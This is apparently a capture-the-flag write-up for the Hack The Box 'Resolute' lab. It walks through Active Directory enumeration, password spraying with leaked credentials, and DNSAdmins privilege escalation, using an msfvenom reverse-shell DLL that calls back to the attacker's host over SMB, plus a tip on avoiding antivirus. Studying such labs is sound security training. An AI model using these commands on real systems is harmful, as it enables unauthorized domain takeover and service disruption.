Resolute is a medium level box that is actually pretty easy with knowledge of basic Windows and Active Directory enumeration techniques. I am a bit unfamiliar with some Command Prompt and Powershell command syntax, making some steps very time consuming. Overall, this box is pretty basic and the information from enumeration should easily connect together.

## Walkthrough

A full nmap port scan and subsequent script scan reveals the following information

```

The usual services in an Active Directory computer are found here. Somthing to note is that we see the Kerberos (88) and DNS (53) services running, implicating that this computer is a domain controller. Aditionally, with the combination of the WinRM (5985), MSRPC (135, 593), LDAP (389, 636, 3268, 3269), and SMB (139, 445) services running, our next step should be to try to enumerate them. A neat tool that enumerates all of this for us (and is also built into Kali) is `enum4linux`. Running is simple, although it doesn't filter out its errors too well so reading through its output is a bit difficult.

```

â””â”€# enum4linux 10.10.10.169

//Note that there is a lot of output that generates within the ~minute it runs, so I'll be posting the more interesting results

Combining the information with the results of the nmap scan, we can summarize that so far we know that: the computer's name is RESOLUTE, with the domain MEGABANK.LOCAL. The computer is a Windows Server 2016, and is probably a domain controller. SMB signing is also turned on, so a NTLM-relay attack won't be a potential attack vector. There is a lack of a lockout policy for incorrect password inputs. Additionally, there seems to be an interesting leak of credentials left on the description of the marko user. If marko is in the Remote Desktop User group, we can log into the computer through the WinRM service using the tool `evil-winrm`

```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HackTheBox/Resolute]
â””â”€# evil-winrm -i 10.10.10.169 -u 'mark' -p 'Welcome123!'      

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

```

This attempt is unsuccessful; it appears that our credentials are invalid. However, we do have a list of users returned from our enum4linux results and we have a potential password. We can use the tool `brutespray` to spray these credentials against SMB (brutespray does not support spraying WinRM); a valid SMB login will hopefully also mean we can authenticate into WinRM with the same credentials. To use brutespray, first we have to output an nmap scan to an xml format so that brutespray can work with it. We can do this with `nmap 10.10.10.169 -p 139,445 -oX scan.xml`. After that, compile a userlist from the enum4linux results.

```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HackTheBox/Resolute]
â””â”€# brutespray -f scan.xml -i
//The -i flag specifies interactive mode

Available services to brute-force:
Service: smbnt on port 445 with 1 hosts

Enter services you want to brute - default all (ssh,ftp,etc): smbnt
Enter the number of parallel threads (default is 2): 2
Enter the number of parallel hosts to scan per service (default is 1): 1
Would you like to specify a wordlist? (y/n): y
Enter a userlist you would like to use: userlist
Enter a passlist you would like to use: 
Would to specify a single username or password (y/n): y
Enter a password: Welcome123!
```

The output will then be sent to: `./brutespray-output`, and a success file should be found in there. Reading it with `cat ./brutespray-output/445-smbnt-success.txt` yields:

```
[+] ACCOUNT FOUND: [smbnt] Host: 10.10.10.169 User: melanie Password: Welcome123! [SUCCESS (ADMIN$ - Access Denied)]
```

This is interesting to note, because none of the other usernames had successes returned by brutespray. This means that the combination `melanie:Welcome123!` successfully authenticated into SMB, however, they were unable to access the ADMIN$ share. Now that we know a valid credential combination, we can try to authenticate into WinRM again.

```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HackTheBox/Resolute]

Sweet. And the user flag is in our Desktop directory too. That wasn't too bad. From here, because this is an Active Directory computer we are working with, I would like to run Bloodhound to find Privilege Escalation and Lateral Movement steps. The specifics of how to set up and run Bloodhound can be found on my blog, so I'll keep it short here. We're just going to gather some data to pass into Bloodhound.

```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HackTheBox/Resolute]
â””â”€# bloodhound-python -u 'melanie' -p 'Welcome123!' -ns 10.10.10.169 -d MEGABANK.LOCAL -c all

```

This will load up a lot of .jsons that we will upload to Bloodhound. After uploading them, I like to start with a prebuilt query of "Shortest Paths to High Value Targets". We can see that our initial assumption was correct; RESOLUTE is a domain controller. Looking further, there is a second user, "ryan". Viewing the "Transitive Object Control" under the "Outbound Control Rights" of this node shows the following graph:

<img src="https://github.com/susMdT/Nigerald/blob/master/assets/images/Resolute_Bloodhound.PNG?raw=true" class="postImagecontent" unselectable="on" />

Ryan is actually apart of the Contractors group which is also apart of the DNSAdmins group. There are something interesting results that come from googling things related to the DNSAdmin and Privilege Escalation. Essentially, if the DNSAdmin has the capability to turn on and off the DNS service (which they don't be default, but it seems to be a common configuration), then they can inject a malicious dll into the DNS service that will be run once the service is restart. The DNS service runs as SYSTEM, so if we can inject a dll that launches a reverse shell and restart the DNS service, we can get SYSTEM. This seems like a plausible attack vector given our current information, but we need to get to ryan first to test this. Back onto melanie, some basic enumeration reveals some PowerShell command history left in the root directory.

```

Traversing through this directory eventually leads us to a file, and when read it reveals the following information:

Now we get to test our brainstormed attack vector. But before we do that, a little bit of enumeration into ryan's Desktop shows a note that says that system changes affecting everything but the administrator account will be reverted after a minute. So we're going to try to chain the commands that we will use to make sure nothing gets messed up. First, we need to generate a dll payload, then point the serverlevelplugindll to the malicious dll, then restart the DNS service. While this all happens, on our attacking machine, we set up a netcat listener to catch the callback. First, for payload generation and listener setup, run the following commands:

```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HackTheBox/Resolute]                                                                                         
â””â”€# nc -nvlp 4444
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HackTheBox/Resolute]                                                       
â””â”€# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=4444 --platform=windows -f dll > bruh.dll
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HackTheBox/Resolute]                                                                                         
â””â”€# smbserver.py share .

//make sure to modify the LHOST to your ip, the LPORT to your port of choice, and the dll to the name of your choice
```

Then, as ryan, run these commands:

```
*Evil-WinRM* PS C:\> cmd /c "dnscmd RESOLUTE.MEGABANK.LOCAL /config /serverlevelplugindll \\10.10.16.6\\share\bruh.dll && sc \\RESOLUTE stop dns && sc \\RESOLUTE start dns"

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

//Note that rather than copying the file directly on the system, it is instead accessed through smb. This is to avoid any potential //antivirus that will recognize the payload if it were to be placed on the machine directly. Also make sure that the call to the smb //share matches your ip address that you started the smb server on.
```

Checking back on our listener, we got SYSTEM. Sweet.

## Afterthoughts

Overall, this box is pretty simple since most of the steps lined up. The enumeration for the PowerShell transcript took some time for me personally since I didn't know how to search for hidden files. Additionally, the DNSAdmins group Privilege Escalation only worked (in this scenario) because we had the privilege to restart the service, which isn't enabled by default. Overall, I enjoyed this box a lot, and while its rather basic, I believe that's what makes it solid for learning Windows and Active Directory.

## Bonus

After doing some extra digging on some articles related to the Privilege Escalation, I found some interesting information. First of all, because our dll was generated and coded for the sole purpose of creating a reverse shell, it actually destroys the DNS service because, due to our dll, the DNS service never finishes starting up. The note left on ryan's desktop talking about how the box resets itself actually fixes this. Therefore, in some actual real world environment, this would not be a good way to go about things as crashing company infrastructure is a bad thing. However, with some coding knowledge (that I lack), it is possible to implement threading into the dll and make DNS function normally while also loading the reverse shell.

Another thing I ran into is that, while by default the DNSAdmins group does not have privileges to restart the DNS service as it did in this box using sc.exe (Service Control), this isn't necessary to accomplish this type of attack. The dnscmd executable itself can restart the DNS service, and the DNSAdmins group can use the executable this way by default. Therefore, another set of chained commands that could be used on the box are:

```
*Evil-WinRM* PS C:\> cmd /c "dnscmd RESOLUTE.MEGABANK.LOCAL /config /serverlevelplugindll \\10.10.16.6\\share\bruh.dll && dnscmd RESOLUTE.MEGABANK.LOCAL /Restart"

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

RESOLUTE.MEGABANK.LOCAL completed successfully.
Command completed successfully.
```

However, the attack vector is not limited to just the DNSAdmins group. Any group with some sort of write privilege on the DNS service object and with the capability to restart the DNS service can accomplish this attack vector. Aside from limiting the privileges of users and the DNSAdmins group, it is possible to also add some sort of check on the dll being configured to further mitigate the possibility of a dll injection occuring.
